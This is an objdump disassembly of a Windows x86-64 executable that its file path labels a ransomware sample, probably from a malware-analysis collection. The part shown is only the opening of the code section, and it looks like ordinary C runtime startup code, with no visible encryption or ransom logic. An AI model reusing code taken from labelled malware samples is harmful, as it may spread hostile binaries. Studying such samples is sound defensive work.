
malware_samples/ransomware/3485419b7a85123f50512ee04e29dfe1ad6d973118b073f16a57565251a4d2f0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	55                   	push   %rbp
   140001001:	48 89 e5             	mov    %rsp,%rbp
   140001004:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140001008:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   14000100c:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140001010:	44 89 4d 28          	mov    %r9d,0x28(%rbp)
   140001014:	90                   	nop
   140001015:	5d                   	pop    %rbp
   140001016:	c3                   	ret
   140001017:	55                   	push   %rbp
   140001018:	48 89 e5             	mov    %rsp,%rbp
   14000101b:	48 83 ec 20          	sub    $0x20,%rsp
   14000101f:	e8 4f 03 00 00       	call   0x140001373
   140001024:	89 05 f6 ff 00 00    	mov    %eax,0xfff6(%rip)        # 0x140011020
   14000102a:	48 8b 05 4f b7 00 00 	mov    0xb74f(%rip),%rax        # 0x14000c780
   140001031:	8b 00                	mov    (%rax),%eax
   140001033:	85 c0                	test   %eax,%eax
   140001035:	74 0c                	je     0x140001043
   140001037:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000103c:	e8 07 90 00 00       	call   0x14000a048
   140001041:	eb 0a                	jmp    0x14000104d
   140001043:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001048:	e8 fb 8f 00 00       	call   0x14000a048
   14000104d:	e8 6e 87 00 00       	call   0x1400097c0
   140001052:	48 8b 15 07 b8 00 00 	mov    0xb807(%rip),%rdx        # 0x14000c860
   140001059:	8b 12                	mov    (%rdx),%edx
   14000105b:	89 10                	mov    %edx,(%rax)
   14000105d:	e8 6e 87 00 00       	call   0x1400097d0
   140001062:	48 8b 15 d7 b7 00 00 	mov    0xb7d7(%rip),%rdx        # 0x14000c840
   140001069:	8b 12                	mov    (%rdx),%edx
   14000106b:	89 10                	mov    %edx,(%rax)
   14000106d:	e8 fe 13 00 00       	call   0x140002470
   140001072:	48 8b 05 57 b6 00 00 	mov    0xb657(%rip),%rax        # 0x14000c6d0
   140001079:	8b 00                	mov    (%rax),%eax
   14000107b:	83 f8 01             	cmp    $0x1,%eax
   14000107e:	75 0f                	jne    0x14000108f
   140001080:	48 8b 05 f9 b7 00 00 	mov    0xb7f9(%rip),%rax        # 0x14000c880
   140001087:	48 89 c1             	mov    %rax,%rcx
   14000108a:	e8 4b 1f 00 00       	call   0x140002fda
   14000108f:	b8 00 00 00 00       	mov    $0x0,%eax
   140001094:	48 83 c4 20          	add    $0x20,%rsp
   140001098:	5d                   	pop    %rbp
   140001099:	c3                   	ret
   14000109a:	55                   	push   %rbp
   14000109b:	48 89 e5             	mov    %rsp,%rbp
   14000109e:	48 83 ec 30          	sub    $0x30,%rsp
   1400010a2:	48 8b 05 e7 b7 00 00 	mov    0xb7e7(%rip),%rax        # 0x14000c890
   1400010a9:	8b 00                	mov    (%rax),%eax
   1400010ab:	89 05 77 ff 00 00    	mov    %eax,0xff77(%rip)        # 0x140011028
   1400010b1:	48 8b 05 98 b7 00 00 	mov    0xb798(%rip),%rax        # 0x14000c850
   1400010b8:	44 8b 00             	mov    (%rax),%r8d
   1400010bb:	4c 8d 15 4e ff 00 00 	lea    0xff4e(%rip),%r10        # 0x140011010
   1400010c2:	48 8d 15 3f ff 00 00 	lea    0xff3f(%rip),%rdx        # 0x140011008
   1400010c9:	48 8d 05 34 ff 00 00 	lea    0xff34(%rip),%rax        # 0x140011004
   1400010d0:	48 8d 0d 51 ff 00 00 	lea    0xff51(%rip),%rcx        # 0x140011028
   1400010d7:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400010dc:	45 89 c1             	mov    %r8d,%r9d
   1400010df:	4d 89 d0             	mov    %r10,%r8
   1400010e2:	48 89 c1             	mov    %rax,%rcx
   1400010e5:	e8 4e 8f 00 00       	call   0x14000a038
   1400010ea:	89 05 28 ff 00 00    	mov    %eax,0xff28(%rip)        # 0x140011018
   1400010f0:	90                   	nop
   1400010f1:	48 83 c4 30          	add    $0x30,%rsp
   1400010f5:	5d                   	pop    %rbp
   1400010f6:	c3                   	ret
   1400010f7:	55                   	push   %rbp
   1400010f8:	48 89 e5             	mov    %rsp,%rbp
   1400010fb:	48 83 ec 30          	sub    $0x30,%rsp
   1400010ff:	c7 45 fc ff 00 00 00 	movl   $0xff,-0x4(%rbp)
   140001106:	48 8b 05 73 b6 00 00 	mov    0xb673(%rip),%rax        # 0x14000c780
   14000110d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001113:	e8 3d 00 00 00       	call   0x140001155
   140001118:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000111b:	90                   	nop
   14000111c:	90                   	nop
   14000111d:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001120:	48 83 c4 30          	add    $0x30,%rsp
   140001124:	5d                   	pop    %rbp
   140001125:	c3                   	ret
   140001126:	55                   	push   %rbp
   140001127:	48 89 e5             	mov    %rsp,%rbp
   14000112a:	48 83 ec 30          	sub    $0x30,%rsp
   14000112e:	c7 45 fc ff 00 00 00 	movl   $0xff,-0x4(%rbp)
   140001135:	48 8b 05 44 b6 00 00 	mov    0xb644(%rip),%rax        # 0x14000c780
   14000113c:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001142:	e8 0e 00 00 00       	call   0x140001155
   140001147:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000114a:	90                   	nop
   14000114b:	90                   	nop
   14000114c:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000114f:	48 83 c4 30          	add    $0x30,%rsp
   140001153:	5d                   	pop    %rbp
   140001154:	c3                   	ret
   140001155:	55                   	push   %rbp
   140001156:	48 89 e5             	mov    %rsp,%rbp
   140001159:	48 83 ec 70          	sub    $0x70,%rsp
   14000115d:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
   140001164:	00 
   140001165:	c7 45 e4 30 00 00 00 	movl   $0x30,-0x1c(%rbp)
   14000116c:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000116f:	65 48 8b 00          	mov    %gs:(%rax),%rax
   140001173:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140001177:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   14000117b:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000117f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140001183:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   14000118a:	eb 21                	jmp    0x1400011ad
   14000118c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001190:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
   140001194:	75 09                	jne    0x14000119f
   140001196:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
   14000119d:	eb 45                	jmp    0x1400011e4
   14000119f:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011a4:	48 8b 05 2d 11 01 00 	mov    0x1112d(%rip),%rax        # 0x1400122d8
   1400011ab:	ff d0                	call   *%rax
   1400011ad:	48 8b 05 1c b6 00 00 	mov    0xb61c(%rip),%rax        # 0x14000c7d0
   1400011b4:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400011b8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400011bc:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400011c0:	48 c7 45 c0 00 00 00 	movq   $0x0,-0x40(%rbp)
   1400011c7:	00 
   1400011c8:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   1400011cc:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   1400011d0:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   1400011d4:	f0 48 0f b1 0a       	lock cmpxchg %rcx,(%rdx)
   1400011d9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400011dd:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   1400011e2:	75 a8                	jne    0x14000118c
   1400011e4:	48 8b 05 f5 b5 00 00 	mov    0xb5f5(%rip),%rax        # 0x14000c7e0
   1400011eb:	8b 00                	mov    (%rax),%eax
   1400011ed:	83 f8 01             	cmp    $0x1,%eax
   1400011f0:	75 0c                	jne    0x1400011fe
   1400011f2:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400011f7:	e8 5c 8e 00 00       	call   0x14000a058
   1400011fc:	eb 3c                	jmp    0x14000123a
   1400011fe:	48 8b 05 db b5 00 00 	mov    0xb5db(%rip),%rax        # 0x14000c7e0
   140001205:	8b 00                	mov    (%rax),%eax
   140001207:	85 c0                	test   %eax,%eax
   140001209:	75 25                	jne    0x140001230
   14000120b:	48 8b 05 ce b5 00 00 	mov    0xb5ce(%rip),%rax        # 0x14000c7e0
   140001212:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001218:	48 8b 15 11 b6 00 00 	mov    0xb611(%rip),%rdx        # 0x14000c830
   14000121f:	48 8b 05 fa b5 00 00 	mov    0xb5fa(%rip),%rax        # 0x14000c820
   140001226:	48 89 c1             	mov    %rax,%rcx
   140001229:	e8 42 8e 00 00       	call   0x14000a070
   14000122e:	eb 0a                	jmp    0x14000123a
   140001230:	c7 05 ea fd 00 00 01 	movl   $0x1,0xfdea(%rip)        # 0x140011024
   140001237:	00 00 00 
   14000123a:	48 8b 05 9f b5 00 00 	mov    0xb59f(%rip),%rax        # 0x14000c7e0
   140001241:	8b 00                	mov    (%rax),%eax
   140001243:	83 f8 01             	cmp    $0x1,%eax
   140001246:	75 23                	jne    0x14000126b
   140001248:	48 8b 15 c1 b5 00 00 	mov    0xb5c1(%rip),%rdx        # 0x14000c810
   14000124f:	48 8b 05 aa b5 00 00 	mov    0xb5aa(%rip),%rax        # 0x14000c800
   140001256:	48 89 c1             	mov    %rax,%rcx
   140001259:	e8 12 8e 00 00       	call   0x14000a070
   14000125e:	48 8b 05 7b b5 00 00 	mov    0xb57b(%rip),%rax        # 0x14000c7e0
   140001265:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   14000126b:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   14000126f:	75 1e                	jne    0x14000128f
   140001271:	48 8b 05 58 b5 00 00 	mov    0xb558(%rip),%rax        # 0x14000c7d0
   140001278:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   14000127c:	48 c7 45 b0 00 00 00 	movq   $0x0,-0x50(%rbp)
   140001283:	00 
   140001284:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140001288:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   14000128c:	48 87 10             	xchg   %rdx,(%rax)
   14000128f:	48 8b 05 9a b4 00 00 	mov    0xb49a(%rip),%rax        # 0x14000c730
   140001296:	48 8b 00             	mov    (%rax),%rax
   140001299:	48 85 c0             	test   %rax,%rax
   14000129c:	74 1c                	je     0x1400012ba
   14000129e:	48 8b 05 8b b4 00 00 	mov    0xb48b(%rip),%rax        # 0x14000c730
   1400012a5:	48 8b 00             	mov    (%rax),%rax
   1400012a8:	41 b8 00 00 00 00    	mov    $0x0,%r8d
   1400012ae:	ba 02 00 00 00       	mov    $0x2,%edx
   1400012b3:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400012b8:	ff d0                	call   *%rax
   1400012ba:	e8 ff 1b 00 00       	call   0x140002ebe
   1400012bf:	48 8b 05 aa b5 00 00 	mov    0xb5aa(%rip),%rax        # 0x14000c870
   1400012c6:	48 89 c1             	mov    %rax,%rcx
   1400012c9:	48 8b 05 00 10 01 00 	mov    0x11000(%rip),%rax        # 0x1400122d0
   1400012d0:	ff d0                	call   *%rax
   1400012d2:	48 8b 15 e7 b4 00 00 	mov    0xb4e7(%rip),%rdx        # 0x14000c7c0
   1400012d9:	48 89 02             	mov    %rax,(%rdx)
   1400012dc:	48 8d 05 1d fd ff ff 	lea    -0x2e3(%rip),%rax        # 0x140001000
   1400012e3:	48 89 c1             	mov    %rax,%rcx
   1400012e6:	e8 15 86 00 00       	call   0x140009900
   1400012eb:	e8 d0 13 00 00       	call   0x1400026c0
   1400012f0:	8b 05 0e fd 00 00    	mov    0xfd0e(%rip),%eax        # 0x140011004
   1400012f6:	48 8d 15 0b fd 00 00 	lea    0xfd0b(%rip),%rdx        # 0x140011008
   1400012fd:	89 c1                	mov    %eax,%ecx
   1400012ff:	e8 73 01 00 00       	call   0x140001477
   140001304:	e8 3e 11 00 00       	call   0x140002447
   140001309:	48 8b 05 40 b4 00 00 	mov    0xb440(%rip),%rax        # 0x14000c750
   140001310:	48 8b 00             	mov    (%rax),%rax
   140001313:	48 8b 15 f6 fc 00 00 	mov    0xfcf6(%rip),%rdx        # 0x140011010
   14000131a:	48 89 10             	mov    %rdx,(%rax)
   14000131d:	48 8b 0d ec fc 00 00 	mov    0xfcec(%rip),%rcx        # 0x140011010
   140001324:	48 8b 15 dd fc 00 00 	mov    0xfcdd(%rip),%rdx        # 0x140011008
   14000132b:	8b 05 d3 fc 00 00    	mov    0xfcd3(%rip),%eax        # 0x140011004
   140001331:	49 89 c8             	mov    %rcx,%r8
   140001334:	89 c1                	mov    %eax,%ecx
   140001336:	e8 ae 0f 00 00       	call   0x1400022e9
   14000133b:	89 05 db fc 00 00    	mov    %eax,0xfcdb(%rip)        # 0x14001101c
   140001341:	8b 05 d9 fc 00 00    	mov    0xfcd9(%rip),%eax        # 0x140011020
   140001347:	85 c0                	test   %eax,%eax
   140001349:	75 0d                	jne    0x140001358
   14000134b:	8b 05 cb fc 00 00    	mov    0xfccb(%rip),%eax        # 0x14001101c
   140001351:	89 c1                	mov    %eax,%ecx
   140001353:	e8 48 8d 00 00       	call   0x14000a0a0
   140001358:	8b 05 c6 fc 00 00    	mov    0xfcc6(%rip),%eax        # 0x140011024
   14000135e:	85 c0                	test   %eax,%eax
   140001360:	75 05                	jne    0x140001367
   140001362:	e8 f9 8c 00 00       	call   0x14000a060
   140001367:	8b 05 af fc 00 00    	mov    0xfcaf(%rip),%eax        # 0x14001101c
   14000136d:	48 83 c4 70          	add    $0x70,%rsp
   140001371:	5d                   	pop    %rbp
   140001372:	c3                   	ret
   140001373:	55                   	push   %rbp
   140001374:	48 89 e5             	mov    %rsp,%rbp
   140001377:	48 83 ec 20          	sub    $0x20,%rsp
   14000137b:	48 8b 05 0e b4 00 00 	mov    0xb40e(%rip),%rax        # 0x14000c790
   140001382:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001388:	48 8b 05 11 b4 00 00 	mov    0xb411(%rip),%rax        # 0x14000c7a0
   14000138f:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001395:	48 8b 05 14 b4 00 00 	mov    0xb414(%rip),%rax        # 0x14000c7b0
   14000139c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013a2:	48 8b 05 47 b3 00 00 	mov    0xb347(%rip),%rax        # 0x14000c6f0
   1400013a9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400013ad:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400013b1:	0f b7 00             	movzwl (%rax),%eax
   1400013b4:	66 3d 4d 5a          	cmp    $0x5a4d,%ax
   1400013b8:	74 0a                	je     0x1400013c4
   1400013ba:	b8 00 00 00 00       	mov    $0x0,%eax
   1400013bf:	e9 ad 00 00 00       	jmp    0x140001471
   1400013c4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400013c8:	8b 40 3c             	mov    0x3c(%rax),%eax
   1400013cb:	48 63 d0             	movslq %eax,%rdx
   1400013ce:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400013d2:	48 01 d0             	add    %rdx,%rax
   1400013d5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400013d9:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400013dd:	8b 00                	mov    (%rax),%eax
   1400013df:	3d 50 45 00 00       	cmp    $0x4550,%eax
   1400013e4:	74 0a                	je     0x1400013f0
   1400013e6:	b8 00 00 00 00       	mov    $0x0,%eax
   1400013eb:	e9 81 00 00 00       	jmp    0x140001471
   1400013f0:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400013f4:	48 83 c0 18          	add    $0x18,%rax
   1400013f8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400013fc:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001400:	0f b7 00             	movzwl (%rax),%eax
   140001403:	0f b7 c0             	movzwl %ax,%eax
   140001406:	3d 0b 01 00 00       	cmp    $0x10b,%eax
   14000140b:	74 09                	je     0x140001416
   14000140d:	3d 0b 02 00 00       	cmp    $0x20b,%eax
   140001412:	74 29                	je     0x14000143d
   140001414:	eb 56                	jmp    0x14000146c
   140001416:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000141a:	8b 40 5c             	mov    0x5c(%rax),%eax
   14000141d:	83 f8 0e             	cmp    $0xe,%eax
   140001420:	77 07                	ja     0x140001429
   140001422:	b8 00 00 00 00       	mov    $0x0,%eax
   140001427:	eb 48                	jmp    0x140001471
   140001429:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000142d:	8b 80 d0 00 00 00    	mov    0xd0(%rax),%eax
   140001433:	85 c0                	test   %eax,%eax
   140001435:	0f 95 c0             	setne  %al
   140001438:	0f b6 c0             	movzbl %al,%eax
   14000143b:	eb 34                	jmp    0x140001471
   14000143d:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001441:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140001445:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140001449:	8b 40 6c             	mov    0x6c(%rax),%eax
   14000144c:	83 f8 0e             	cmp    $0xe,%eax
   14000144f:	77 07                	ja     0x140001458
   140001451:	b8 00 00 00 00       	mov    $0x0,%eax
   140001456:	eb 19                	jmp    0x140001471
   140001458:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   14000145c:	8b 80 e0 00 00 00    	mov    0xe0(%rax),%eax
   140001462:	85 c0                	test   %eax,%eax
   140001464:	0f 95 c0             	setne  %al
   140001467:	0f b6 c0             	movzbl %al,%eax
   14000146a:	eb 05                	jmp    0x140001471
   14000146c:	b8 00 00 00 00       	mov    $0x0,%eax
   140001471:	48 83 c4 20          	add    $0x20,%rsp
   140001475:	5d                   	pop    %rbp
   140001476:	c3                   	ret
   140001477:	55                   	push   %rbp
   140001478:	53                   	push   %rbx
   140001479:	48 83 ec 48          	sub    $0x48,%rsp
   14000147d:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140001482:	89 4d 20             	mov    %ecx,0x20(%rbp)
   140001485:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140001489:	8b 45 20             	mov    0x20(%rbp),%eax
   14000148c:	83 c0 01             	add    $0x1,%eax
   14000148f:	48 98                	cltq
   140001491:	48 c1 e0 03          	shl    $0x3,%rax
   140001495:	48 89 c1             	mov    %rax,%rcx
   140001498:	e8 53 8c 00 00       	call   0x14000a0f0
   14000149d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400014a1:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400014a5:	48 8b 00             	mov    (%rax),%rax
   1400014a8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400014ac:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400014b3:	e9 8c 00 00 00       	jmp    0x140001544
   1400014b8:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400014bb:	48 98                	cltq
   1400014bd:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   1400014c4:	00 
   1400014c5:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400014c9:	48 01 d0             	add    %rdx,%rax
   1400014cc:	48 8b 00             	mov    (%rax),%rax
   1400014cf:	48 89 c1             	mov    %rax,%rcx
   1400014d2:	e8 51 8c 00 00       	call   0x14000a128
   1400014d7:	48 83 c0 01          	add    $0x1,%rax
   1400014db:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400014df:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400014e2:	48 98                	cltq
   1400014e4:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   1400014eb:	00 
   1400014ec:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400014f0:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
   1400014f4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   1400014f8:	48 89 c1             	mov    %rax,%rcx
   1400014fb:	e8 f0 8b 00 00       	call   0x14000a0f0
   140001500:	48 89 03             	mov    %rax,(%rbx)
   140001503:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001506:	48 98                	cltq
   140001508:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   14000150f:	00 
   140001510:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140001514:	48 01 d0             	add    %rdx,%rax
   140001517:	48 8b 10             	mov    (%rax),%rdx
   14000151a:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000151d:	48 98                	cltq
   14000151f:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
   140001526:	00 
   140001527:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000152b:	48 01 c8             	add    %rcx,%rax
   14000152e:	48 8b 00             	mov    (%rax),%rax
   140001531:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140001535:	49 89 c8             	mov    %rcx,%r8
   140001538:	48 89 c1             	mov    %rax,%rcx
   14000153b:	e8 b8 8b 00 00       	call   0x14000a0f8
   140001540:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140001544:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001547:	3b 45 20             	cmp    0x20(%rbp),%eax
   14000154a:	0f 8c 68 ff ff ff    	jl     0x1400014b8
   140001550:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140001553:	48 98                	cltq
   140001555:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   14000155c:	00 
   14000155d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140001561:	48 01 d0             	add    %rdx,%rax
   140001564:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   14000156b:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000156f:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140001573:	48 89 10             	mov    %rdx,(%rax)
   140001576:	90                   	nop
   140001577:	48 83 c4 48          	add    $0x48,%rsp
   14000157b:	5b                   	pop    %rbx
   14000157c:	5d                   	pop    %rbp
   14000157d:	c3                   	ret
   14000157e:	55                   	push   %rbp
   14000157f:	48 89 e5             	mov    %rsp,%rbp
   140001582:	48 83 ec 20          	sub    $0x20,%rsp
   140001586:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000158a:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000158e:	48 89 c1             	mov    %rax,%rcx
   140001591:	e8 ea 8a 00 00       	call   0x14000a080
   140001596:	48 85 c0             	test   %rax,%rax
   140001599:	74 07                	je     0x1400015a2
   14000159b:	b8 00 00 00 00       	mov    $0x0,%eax
   1400015a0:	eb 05                	jmp    0x1400015a7
   1400015a2:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400015a7:	48 83 c4 20          	add    $0x20,%rsp
   1400015ab:	5d                   	pop    %rbp
   1400015ac:	c3                   	ret
   1400015ad:	90                   	nop
   1400015ae:	90                   	nop
   1400015af:	90                   	nop
   1400015b0:	c3                   	ret
   1400015b1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400015b8:	00 00 00 00 
   1400015bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400015c0:	31 c0                	xor    %eax,%eax
   1400015c2:	c3                   	ret
   1400015c3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400015ca:	00 00 00 00 
   1400015ce:	66 90                	xchg   %ax,%ax
   1400015d0:	55                   	push   %rbp
   1400015d1:	53                   	push   %rbx
   1400015d2:	48 83 ec 38          	sub    $0x38,%rsp
   1400015d6:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400015db:	48 8d 0d 1e aa 00 00 	lea    0xaa1e(%rip),%rcx        # 0x14000c000
   1400015e2:	ff 15 a8 0c 01 00    	call   *0x10ca8(%rip)        # 0x140012290
   1400015e8:	48 89 c3             	mov    %rax,%rbx
   1400015eb:	48 85 c0             	test   %rax,%rax
   1400015ee:	74 70                	je     0x140001660
   1400015f0:	48 8d 0d 09 aa 00 00 	lea    0xaa09(%rip),%rcx        # 0x14000c000
   1400015f7:	ff 15 bb 0c 01 00    	call   *0x10cbb(%rip)        # 0x1400122b8
   1400015fd:	4c 8b 0d 94 0c 01 00 	mov    0x10c94(%rip),%r9        # 0x140012298
   140001604:	48 8d 15 08 aa 00 00 	lea    0xaa08(%rip),%rdx        # 0x14000c013
   14000160b:	48 89 d9             	mov    %rbx,%rcx
   14000160e:	48 89 05 2b fa 00 00 	mov    %rax,0xfa2b(%rip)        # 0x140011040
   140001615:	4c 89 4d f0          	mov    %r9,-0x10(%rbp)
   140001619:	41 ff d1             	call   *%r9
   14000161c:	48 8d 15 06 aa 00 00 	lea    0xaa06(%rip),%rdx        # 0x14000c029
   140001623:	48 89 d9             	mov    %rbx,%rcx
   140001626:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000162a:	ff 55 f0             	call   *-0x10(%rbp)
   14000162d:	4c 8b 45 f8          	mov    -0x8(%rbp),%r8
   140001631:	48 89 05 c8 99 00 00 	mov    %rax,0x99c8(%rip)        # 0x14000b000
   140001638:	4d 85 c0             	test   %r8,%r8
   14000163b:	74 11                	je     0x14000164e
   14000163d:	48 8d 15 1c fa 00 00 	lea    0xfa1c(%rip),%rdx        # 0x140011060
   140001644:	48 8d 0d b5 c9 00 00 	lea    0xc9b5(%rip),%rcx        # 0x14000e000
   14000164b:	41 ff d0             	call   *%r8
   14000164e:	48 8d 0d 2b 00 00 00 	lea    0x2b(%rip),%rcx        # 0x140001680
   140001655:	48 83 c4 38          	add    $0x38,%rsp
   140001659:	5b                   	pop    %rbx
   14000165a:	5d                   	pop    %rbp
   14000165b:	e9 1e ff ff ff       	jmp    0x14000157e
   140001660:	48 8d 05 59 ff ff ff 	lea    -0xa7(%rip),%rax        # 0x1400015c0
   140001667:	4c 8d 05 42 ff ff ff 	lea    -0xbe(%rip),%r8        # 0x1400015b0
   14000166e:	48 89 05 8b 99 00 00 	mov    %rax,0x998b(%rip)        # 0x14000b000
   140001675:	eb c6                	jmp    0x14000163d
   140001677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000167e:	00 00 
   140001680:	55                   	push   %rbp
   140001681:	48 89 e5             	mov    %rsp,%rbp
   140001684:	48 83 ec 20          	sub    $0x20,%rsp
   140001688:	48 8b 05 71 99 00 00 	mov    0x9971(%rip),%rax        # 0x14000b000
   14000168f:	48 85 c0             	test   %rax,%rax
   140001692:	74 09                	je     0x14000169d
   140001694:	48 8d 0d 65 c9 00 00 	lea    0xc965(%rip),%rcx        # 0x14000e000
   14000169b:	ff d0                	call   *%rax
   14000169d:	48 8b 0d 9c f9 00 00 	mov    0xf99c(%rip),%rcx        # 0x140011040
   1400016a4:	48 85 c9             	test   %rcx,%rcx
   1400016a7:	74 0f                	je     0x1400016b8
   1400016a9:	48 83 c4 20          	add    $0x20,%rsp
   1400016ad:	5d                   	pop    %rbp
   1400016ae:	48 ff 25 cb 0b 01 00 	rex.W jmp *0x10bcb(%rip)        # 0x140012280
   1400016b5:	0f 1f 00             	nopl   (%rax)
   1400016b8:	48 83 c4 20          	add    $0x20,%rsp
   1400016bc:	5d                   	pop    %rbp
   1400016bd:	c3                   	ret
   1400016be:	90                   	nop
   1400016bf:	90                   	nop
   1400016c0:	55                   	push   %rbp
   1400016c1:	48 89 e5             	mov    %rsp,%rbp
   1400016c4:	48 83 ec 30          	sub    $0x30,%rsp
   1400016c8:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400016cc:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   1400016d0:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   1400016d4:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   1400016d8:	48 8d 45 20          	lea    0x20(%rbp),%rax
   1400016dc:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400016e0:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400016e4:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   1400016e8:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400016ec:	49 89 c8             	mov    %rcx,%r8
   1400016ef:	48 89 c1             	mov    %rax,%rcx
   1400016f2:	e8 89 23 00 00       	call   0x140003a80
   1400016f7:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400016fa:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400016fd:	48 83 c4 30          	add    $0x30,%rsp
   140001701:	5d                   	pop    %rbp
   140001702:	c3                   	ret
   140001703:	55                   	push   %rbp
   140001704:	53                   	push   %rbx
   140001705:	48 83 ec 38          	sub    $0x38,%rsp
   140001709:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   14000170e:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140001712:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140001716:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   14000171a:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   14000171e:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140001722:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
